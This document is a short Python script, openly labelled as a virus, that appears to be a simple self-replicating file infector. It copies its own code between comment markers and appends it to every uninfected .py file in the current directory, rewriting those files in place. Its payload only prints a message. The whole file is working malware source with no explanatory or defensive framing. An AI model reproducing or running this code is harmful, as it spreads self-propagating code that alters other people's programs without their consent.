print("there")
#strat of the virus

import sys,re,glob,os


virusCode=[]

thisFile=sys.argv[0]
virusFile=open(thisFile,"r")
lines=virusFile.readlines()
virusFile.close()

state=False
for i in lines:
    if(re.search("^#strat of the virus",i)):
        state=True
    if(state==True):
        virusCode.append(i)
    if(re.search("^#end of virus code",i)):
        break
#checks and affects other programs
programs=glob.glob("*.py")
print(programs)

for p in programs:
    file=open(p,"r")
    programCode=file.readlines()
    file.close()
    infected=False

    for program_line in programCode:

        if(re.search("^#strat of the virus",program_line)):
            
            infected=True
            break

    # print("hello")

    if not infected:
        newCode=[]
        newCode=programCode
        virusCode[0]='\n#strat of the virus\n'
        newCode.extend(virusCode)
        # print(virusCode)
        # print(newCode)
        # print(newCode)
        print(virusCode)
        

        file=open(p,"w")
        file.writelines(newCode)
        file.close()

#payload

print("the file is infected!!!!")



#end of virus code